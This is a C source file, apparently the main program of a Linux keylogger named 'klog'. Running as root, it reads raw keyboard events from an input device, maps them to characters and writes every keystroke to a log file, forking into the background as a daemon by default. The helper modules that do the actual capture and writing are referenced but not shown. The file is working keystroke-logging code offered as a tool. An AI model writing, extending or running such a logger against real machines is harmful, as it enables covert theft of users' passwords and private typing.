#include <stdio.h>
#include <unistd.h>
#include <stdarg.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/input.h>

#include "mapper.h"
#include "logger.h"


#define PROGNAME	"klog"
#define VERSION		"1.0"
#define DEFAULT_MAP	"./map/en_US.map"

#define F_NODAEMON	(1 << 0)


static int	stoplog = 0;


static void usage(void)
{
	fprintf(stderr, "usage: %s [options] <eventid>\n", PROGNAME);
	fprintf(stderr, "options:\n");
	fprintf(stderr, "\t-h       : display this and exit\n");
	fprintf(stderr, "\t-v       : display version number and exit\n");
	fprintf(stderr, "\t-o <log> : write log to <log> (default=stdout)\n");
	fprintf(stderr, "\t-m <map> : load the map character <map> (default=%s)\n", DEFAULT_MAP);
	fprintf(stderr, "\t-f       : keep on foreground (eg: no daemon)\n");
}


static void version(void)
{
	fprintf(stderr, "%s version %s\n", PROGNAME, VERSION);
}


static void handle_signal(int sig)
{
	fprintf(stderr, "Received signal %d\n", sig);
	stoplog = 1;
}


static void setup_signals()
{
	struct sigaction	s;

	memset(&s, 0, sizeof s);
	s.sa_handler = handle_signal;
	s.sa_flags = 0;

	sigaction(SIGINT, &s, NULL);
	sigaction(SIGTERM, &s, NULL);
}


static int loop(struct log *log, struct map *map)
{
	struct input_event	ev;
	const char		*key;

	while ( !stoplog )
	{
		if ( logger_get_event(&ev, log) )
			continue;

		if ( (key = mapper_get_key(&ev, map)) == NULL )
			continue;

		logger_save(key, log);
	}

	return 0;
}


int main(int argc, char *argv[])
{
	int		c,
			ret = -1;
	const char	*logname = "-";
	const char	*mapname = DEFAULT_MAP;
	struct map	*map = NULL;
	struct log	*log = NULL;
	unsigned	flags = 0;

	while ( (c = getopt(argc, argv, "hvo:m:f")) != -1 )
	{
		switch ( c )
		{
			case 'h':
			usage();
			return 0;

			case 'v':
			version();
			return 0;

			case 'o':
			logname = optarg;
			break;

			case 'm':
			mapname = optarg;
			break;

			case 'f':
			flags |= F_NODAEMON;
			break;

			default:
			fprintf(stderr, "Unknown option %c\n", (char) c);
			goto error;
		}
	}

	argc -= optind, argv += optind;

	if ( argc == 0 )
	{
		usage();
		goto error;
	}

	if ( getuid() != 0 )
	{
		fprintf(stderr, "Are you root ?\n");
		goto error;
	}

	if ( (map = mapper_load(mapname)) == NULL )
	{
		fprintf(stderr, "Unable to load char map %s\n", mapname);
		goto error;
	}

	setup_signals();

	/* Now, we can daemonize
	 */
	if ( (flags & F_NODAEMON) == 0 )
	{
		int	pid;

		switch ( (pid = fork()) )
		{
			case 0:
			fprintf(stderr, "Fork success\n");
			break;

			case -1:
			perror("Can not fork !");
			goto error;

			default:
			fprintf(stderr, "Child pid %d\n", pid);
			return 0;
		}
	}


	if ( (log = logger_open(logname, argv[0])) == NULL )
		goto error;

	/* Start the main loop
	 */
	if ( loop(log, map) )
		fprintf(stderr, "Something went wrong...");
	else
		ret = 0;

error:
	if ( log != NULL )
		logger_close(log);

	if ( map != NULL )
		mapper_unload(map);

	return ret;
}
